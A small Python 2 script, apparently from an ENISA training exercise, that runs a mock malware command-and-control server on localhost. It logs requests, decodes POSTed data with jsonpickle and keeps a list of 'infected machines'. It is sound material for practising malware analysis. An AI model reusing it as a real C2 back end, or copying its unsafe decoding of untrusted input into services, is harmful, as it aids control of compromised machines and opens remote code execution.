from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import urlparse
import jsonpickle
import logging

infected_machines = []


class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        message = '\n'.join([
            '======== ENISA MALWARE C2 ========',
            'CLIENT VALUES:',
            'client_address=%s (%s)' % (self.client_address,
                self.address_string()),
            'command=%s' % self.command,
            'path=%s' % self.path,
            'real path=%s' % parsed_path.path,
            'query=%s' % parsed_path.query,
            'request_version=%s' % self.request_version,
            '',
            'SERVER VALUES:',
            'server_version=%s' % self.server_version,
            'sys_version=%s' % self.sys_version,
            'protocol_version=%s' % self.protocol_version,
            '',
            ])
        self.send_response(200)
        self.end_headers()

        logging.info('[GET] || CLIENT: %s || PATH: %s' % (self.client_address[0], parsed_path.path))
        self.wfile.write(message)
        return

    def do_POST(self):
        content_len = int(self.headers.getheader('content-length'))
        post_body = self.rfile.read(content_len)

        request_data = jsonpickle.decode(post_body)
        logging.info('[POST] || CLIENT: %s || DATA: %s' % (self.client_address[0], request_data))

        if self.client_address[0] not in infected_machines:
            infected_machines.append(self.client_address[0])

        self.send_response(404)
        self.end_headers()
        self.wfile.write('OK')
        return

if __name__ == '__main__':
    logging.basicConfig(filename='c2_log.txt',
                        level=logging.INFO,
                        format='%(asctime)s %(levelname)s: %(message)s',
                        datefmt='%d-%m-%Y %I:%M:%S %p')

    server = HTTPServer(('localhost', 1337), GetHandler)
    server.serve_forever()

